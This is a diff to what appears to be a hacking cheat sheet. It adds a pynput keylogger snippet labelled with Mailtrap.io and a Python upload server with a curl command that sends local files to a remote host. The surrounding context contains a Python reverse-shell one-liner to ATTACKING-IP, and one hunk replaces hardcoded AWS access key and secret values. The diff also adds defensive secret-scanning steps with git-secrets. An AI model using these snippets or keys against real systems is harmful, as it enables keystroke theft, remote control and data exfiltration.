@@ -579,10 +579,37 @@ hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
 ```
 
+Mailtrap.io implementation:
+
+```python
+from pynput import keyboard
+from pynput.keyboard import Listener
+...
+keyboard_listener = keyboard.Listener(on_press=self.save_data)
+with keyboard_listener:
+    self.report()
+    keyboard_listener.join()
+```
+
 # Python Reverse Shell:
 
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+# Python Basic File Upload
+
+```python
+# Listen to files
+python3 -m pip install --user uploadserver
+python3 -m uploadserver
+# With basic auth: 
+# python3 -m uploadserver --basic-auth hello:world
+
+# Send a file
+curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
+# With basic auth:
+# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
 
 ## Generating HoneyDocs with Python:
@@ -664,8 +691,8 @@ Python code to check if AWS key has permissions to read s3 buckets:
 import boto3
 import json
 
-aws_access_key_id = 'AKIA2OGYBAH6S4M5DDZO'
-aws_secret_access_key = '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'
+aws_access_key_id = 'AKIAQYLPMN5HIUI65MP3'
+aws_secret_access_key = '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'
 region = 'us-east-2'
 
 session = boto3.Session(
@@ -986,6 +1013,25 @@ func main() {
     hooks:
     -   id: detect-aws-credentials
     -   id: detect-private-key
+```
+
+## Scanning Git History for Secrets:
+
+```
+# Install git-secrets and build
+git clone https://github.com/awslabs/git-secrets.git
+cd git-secrets
+make install
+
+# Register needed plugins
+git secrets -register-azure
+git secrets -register-aws
+git secrets — register-gcp
+
+# Scan Git
+git secrets --scan 
+git secrets --scan-history 
+git secrets --scan /path/to/file
 ```
 
 ## Mac SMB Lateral Movement:
